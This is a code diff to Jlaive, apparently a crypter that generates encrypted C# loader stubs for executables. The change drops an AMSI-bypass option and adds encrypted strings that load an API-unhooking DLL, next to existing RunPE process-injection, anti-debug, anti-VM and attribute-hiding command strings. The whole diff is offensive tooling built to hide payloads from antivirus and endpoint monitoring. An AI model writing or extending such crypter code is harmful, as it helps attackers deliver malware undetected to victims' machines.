@@ -26,7 +26,7 @@ namespace Jlaive
             return ($"${base64name} = '{srcclass}';", command);
         }
 
-        public static string CreateCS(byte[] key, byte[] iv, EncryptionMode mode, bool bamsi, bool antidebug, bool antivm, bool native, Random rng)
+        public static string CreateCS(byte[] key, byte[] iv, EncryptionMode mode, bool antidebug, bool antivm, bool native, Random rng)
         {
             string namespacename = RandomString(10, rng);
             string classname = RandomString(10, rng);
@@ -44,6 +44,9 @@ namespace Jlaive
             string runpedlltxt_str = Convert.ToBase64String(Encrypt(mode, Encoding.UTF8.GetBytes("runpe.dll"), key, iv));
             string runpeclass_str = Convert.ToBase64String(Encrypt(mode, Encoding.UTF8.GetBytes("runpe.RunPE"), key, iv));
             string runpefunction_str = Convert.ToBase64String(Encrypt(mode, Encoding.UTF8.GetBytes("ExecutePE"), key, iv));
+            string unhookertxt_str = Convert.ToBase64String(Encrypt(mode, Encoding.UTF8.GetBytes("apiunhooker.dll"), key, iv));
+            string unhookerclass_str = Convert.ToBase64String(Encrypt(mode, Encoding.UTF8.GetBytes("apiunhooker.APIUnhooker"), key, iv));
+            string unhookerfunction_str = Convert.ToBase64String(Encrypt(mode, Encoding.UTF8.GetBytes("Start"), key, iv));
             string cmdcommand_str = Convert.ToBase64String(Encrypt(mode, Encoding.UTF8.GetBytes("/c choice /c y /n /d y /t 1 & attrib -s -h \""), key, iv));
             string key_str = Convert.ToBase64String(key);
             string iv_str = Convert.ToBase64String(iv);
@@ -54,7 +57,6 @@ namespace Jlaive
             string stubcode = reader.ReadToEnd();
             reader.Dispose();
 
-            if (bamsi) stub += "#define AMSI_BYPASS\n";
             if (antidebug) stub += "#define ANTI_DEBUG\n";
             if (antivm) stub += "#define ANTI_VM\n";
             if (native) stub += "#define USE_RUNPE\n";
@@ -75,6 +77,9 @@ namespace Jlaive
             stubcode = stubcode.Replace("runpedlltxt_str", runpedlltxt_str);
             stubcode = stubcode.Replace("runpeclass_str", runpeclass_str);
             stubcode = stubcode.Replace("runpefunction_str", runpefunction_str);
+            stubcode = stubcode.Replace("unhookertxt_str", unhookertxt_str);
+            stubcode = stubcode.Replace("unhookerclass_str", unhookerclass_str);
+            stubcode = stubcode.Replace("unhookerfunction_str", unhookerfunction_str);
             stubcode = stubcode.Replace("cmdcommand_str", cmdcommand_str);
             stubcode = stubcode.Replace("key_str", key_str);
             stubcode = stubcode.Replace("iv_str", iv_str);
